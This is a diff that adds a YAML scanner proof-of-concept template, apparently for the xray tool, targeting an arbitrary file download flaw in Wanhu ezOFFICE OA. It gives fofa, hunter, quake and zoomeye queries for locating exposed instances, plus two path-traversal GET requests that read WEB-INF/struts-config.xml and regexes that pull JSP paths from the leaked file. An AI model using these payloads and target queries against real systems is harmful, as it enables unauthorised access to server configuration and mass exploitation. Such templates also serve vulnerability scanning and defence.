@@ -1,0 +1,53 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+    
+name: poc-yaml-wanhu-ezoffice-download_netdisk.jsp-file-download
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/struts-config&fileExtName=xml&fileSaveName=config
+            headers:
+            body: 
+        expression: response.status == 200 && response.body_string.contains("xml version") && response.body_string.contains("struts-config")
+
+        output:
+          search: |-
+            "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/struts-config.xml&name=struts-config.xml
+            headers:
+            body: 
+        expression: response.status == 200 && response.body_string.contains("xml version") && response.body_string.contains("struts-config")
+
+
+expression: r0() || r1()
